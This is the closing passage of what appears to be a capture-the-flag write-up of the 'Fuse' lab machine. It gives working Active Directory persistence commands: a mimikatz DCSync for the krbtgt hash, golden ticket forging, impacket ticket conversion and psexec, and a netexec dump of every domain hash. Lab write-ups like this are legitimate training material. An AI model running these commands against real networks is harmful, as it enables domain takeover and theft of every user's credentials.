
6.  **Get our root flag**:
    -   {{< figure src="/ox-hugo/2024-10-18-144054_.png" >}}


## 5. Persistence: {#5-dot-persistence}


### Creating a Golden Ticket with `mimikatz`: {#creating-a-golden-ticket-with-mimikatz}

-   **I transfer** `mimikatz.exe` **over using my existing** `evil-winrm` **session**:
    -   {{< figure src="/ox-hugo/2024-10-18-145858_.png" >}}

-   **I perform a** `DCsync` **attack to retrieve the** `krbtgt NTLM hash`:
    -   `lsadump::dcsync /user:krbtgt /domain:fabricorp.local`
    -   {{< figure src="/ox-hugo/2024-10-18-145454_.png" >}}
    -   I also retrieve the domain `SID`

-   **I create my golden ticket using** `mimikatz` **&amp; the** `krbtgt` **hash to make myself a 10 year ticket**:
    -   `kerberos::golden /domain:fabricorp.local /user:Administrator /sid:S-1-5-21-2633719317-1471316042-3957863514 /rc4:8ee7[REDACTED]87b0`
    -   {{< figure src="/ox-hugo/2024-10-18-150330_.png" >}}

-   **I transfer the ticket back myself using** `evil-winrm`:
    -   {{< figure src="/ox-hugo/2024-10-18-145847_.png" >}}

-   **I convert the ticket so I can use it locally on linux**:
    -   `impacket-ticketConverter ticket.kirbi admin.ccache`
    -   {{< figure src="/ox-hugo/2024-10-18-145921_.png" >}}

-   **I sync my clock with the target**:
    -   `sudo ntpdate -s fuse.$domain`
    -   {{< figure src="/ox-hugo/2024-10-18-145936_.png" >}}

-   **I load the ticket into the** `KRB5CCNAME` **variable**:
    -   `export KRB5CCNAME=./admin.ccache`
    -   {{< figure src="/ox-hugo/2024-10-18-145947_.png" >}}

-   **I verify it works using a** `psexec` **session**:
    -   `impacket-psexec fuse.$domain -k`
    -   {{< figure src="/ox-hugo/2024-10-18-145959_.png" >}}


### Full DCSync attack using `netexec` and Golden Ticket: {#full-dcsync-attack-using-netexec-and-golden-ticket}

-   **Now that we have our Golden ticket we can use it to perform a DCSync attack and extract all the hashes**:
    -   `netexec smb $box --use-kcache -M ntdsutil`
    -   {{< figure src="/ox-hugo/2024-10-18-150059_.png" >}}



## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1. I learned that trying to get all your enumeration done very quickly before the password is reset can be frustrating. 

2. I learned that people will always use the description field to hold important information. 

3. I learned that the exploit really did not want to execute the nc64.exe binary no matter how hard I tried. However I think I may have a record for speed-running compiling exploits. 

### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1. Had to revert the machine and forgot the hosts. 



## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me

